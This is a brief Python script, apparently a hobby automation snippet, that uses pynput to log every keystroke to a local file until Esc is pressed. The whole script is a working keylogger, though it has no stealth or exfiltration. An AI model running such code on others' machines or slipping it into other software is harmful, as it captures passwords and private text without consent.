from pynput import keyboard

f = open("Q:\\random_automation\\logged.txt","w") 

def on_press(key):

    try:
        f.write(key.char) 

    except AttributeError:
        if key == keyboard.Key.space:
            f.write(' ') 
        elif key == keyboard.Key.enter:
            f.write('\n') 
        elif key == keyboard.Key.esc:
            return False
        else:
            KeyCode = "'" + str(key).split('.')[1] + "'"
            f.write(KeyCode) 


with keyboard.Listener(on_press=on_press) as l:
    l.join()

